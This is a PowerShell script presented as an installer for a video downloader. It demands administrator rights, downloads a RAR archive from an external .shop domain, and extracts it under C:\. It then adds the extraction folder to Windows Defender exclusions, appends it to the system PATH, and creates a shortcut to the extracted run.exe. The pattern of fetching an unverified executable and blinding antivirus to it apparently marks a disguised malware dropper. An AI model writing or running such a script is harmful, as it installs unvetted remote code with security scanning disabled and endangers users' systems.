# ========================================
# ViDD Advanced Downloader Installer Script
# ========================================

# Check for admin
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator"))
{
    Write-Host "Please run this script as Administrator."
    exit
}

$downloadURL = "https://www.api-qsr.shop/vidd_exe.rar"
$archiveFile = "$env:TEMP\vidd_exe.rar"
$extractFolder = "C:\vidd_exe"
$exeName = "run.exe"
$batName = "run_me.bat"
$shortcutName = "ViDD Advance Downloader.lnk"
$iconFile = "$PSScriptRoot\main.icon"  # Assuming the .icon file is in same folder as the script

Write-Host "Downloading file..."
Invoke-WebRequest -Uri $downloadURL -OutFile $archiveFile -UseBasicParsing

Write-Host "Downloaded file size:"
(Get-Item $archiveFile).length

If (!(Test-Path $extractFolder)) { New-Item -ItemType Directory -Path $extractFolder | Out-Null }

# Check header
$headerBytes = Get-Content -Path $archiveFile -Encoding Byte -TotalCount 4
$header = ($headerBytes | ForEach-Object { $_.ToString("X2") }) -join ""

Write-Host "File header: $header"

if ($header -eq "52617221") {
    Write-Host "Detected RAR archive."

    # Check WinRAR
    $winrar = "${env:ProgramFiles}\WinRAR\WinRAR.exe"
    if (!(Test-Path $winrar)) { $winrar = "${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe" }

    if (Test-Path $winrar) {
        & $winrar x -o+ $archiveFile "$extractFolder\"
    } else {
        Write-Host "WinRAR not found. Cannot extract RAR."
        exit
    }

} elseif ($header -eq "504B0304") {
    Write-Host "Detected ZIP archive."
    Try {
        Expand-Archive -Path $archiveFile -DestinationPath $extractFolder -Force -ErrorAction Stop
    }
    Catch {
        Write-Host "Extraction failed."
        exit
    }
} else {
    Write-Host "Unknown file type. Extraction aborted."
    exit
}

# Detect extracted folder
Write-Host "Detecting extracted folder structure..."
$finalFolder = $extractFolder
$subfolders = Get-ChildItem -Path $extractFolder -Directory
if ($subfolders.Count -eq 1) {
    $finalFolder = $subfolders[0].FullName
}
Write-Host "Using final folder path: $finalFolder"

# Add to Defender exclusion
Write-Host "Adding folder to Defender exclusions..."
Add-MpPreference -ExclusionPath $finalFolder

# Add to system PATH
Write-Host "Adding exe to environment PATH..."
$existingPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
if ($existingPath -notlike "*$finalFolder*") {
    [Environment]::SetEnvironmentVariable("Path", "$existingPath;$finalFolder", "Machine")
}

# Create run_me.bat file
Write-Host "Creating run_me.bat file..."
$batContent = "@echo off`nstart `"$finalFolder\$exeName`""
Set-Content -Path "$finalFolder\$batName" -Value $batContent -Encoding ASCII

# Create desktop shortcut with custom icon
Write-Host "Creating desktop shortcut..."
$WshShell = New-Object -ComObject WScript.Shell
$desktopPath = [Environment]::GetFolderPath("Desktop")
$shortcut = $WshShell.CreateShortcut("$desktopPath\$shortcutName")
$shortcut.TargetPath = "$finalFolder\$exeName"
$shortcut.WorkingDirectory = $finalFolder
if (Test-Path $iconFile) {
    $shortcut.IconLocation = $iconFile
} else {
    Write-Host "Icon file not found. Using default icon."
}
$shortcut.Save()

Write-Host "Done!"
Read-Host -Prompt "Press Enter to exit"
